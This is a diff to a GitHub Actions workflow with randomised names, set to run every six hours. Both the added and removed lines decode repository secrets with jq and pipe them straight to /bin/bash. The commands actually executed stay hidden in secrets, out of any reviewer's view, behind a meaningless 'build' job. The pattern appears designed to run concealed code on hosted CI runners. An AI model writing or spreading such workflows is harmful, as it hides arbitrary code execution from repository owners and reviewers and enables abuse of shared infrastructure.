@@ -2,34 +2,21 @@ name: exactbarred
 on:
   workflow_dispatch:
   schedule:
-    - cron: '6 2/6 * * *'
-jobs:  # 32288
+    - cron: '15 0/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: exactbarred
         env:
-          lslzc1653: ${{ secrets.lslzc1653 }}
+          w42902: ${{ secrets.w42902 }}
         run: |
-          echo $lslzc1653 | jq -r .chz4705 | /bin/bash
-          echo $eudjl080 | jq -r .vtnb592 | /bin/bash
-          echo $snqq388 | jq -r .am00577 | /bin/bash
-          echo $d99745 | jq -r .qwe46323 | /bin/bash
-          echo $eekgv90 | jq -r .i6 | /bin/bash
-          echo $uoly3249 | jq -r .rm0542 | /bin/bash
-          echo $g80812 | jq -r .gtk08 | /bin/bash
-          echo $mnnwc309 | jq -r .nhcdf177 | /bin/bash
-          echo $u75 | jq -r .k76 | /bin/bash
-          echo $qnqyp16473 | jq -r .iezg803 | /bin/bash
-          echo $njbi49 | jq -r .pckt21 | /bin/bash
-          echo $rst5 | jq -r .mrxkd690 | /bin/bash
-          echo $kwv61924 | jq -r .us2 | /bin/bash
-          echo $bgwd68 | jq -r .x7276 | /bin/bash
-          echo $mf32 | jq -r .hd5684 | /bin/bash
-          echo $o28117 | jq -r .tw17 | /bin/bash
-          echo $vwi9 | jq -r .uznx0972 | /bin/bash
-          echo $ffdf91118 | jq -r .thn6 | /bin/bash
-          echo $njtuh37955 | jq -r .wru9 | /bin/bash
+          echo $w42902 | jq -r .jpb8 | /bin/bash
+          echo $gyb7 | jq -r .wkgy12 | /bin/bash
+          echo $qpv6016 | jq -r .zu899 | /bin/bash
+          echo $sh93503 | jq -r .iub4 | /bin/bash
+          echo $xbzmv34303 | jq -r .zyj30100 | /bin/bash
+          echo $bg0461 | jq -r .e88 | /bin/bash
 
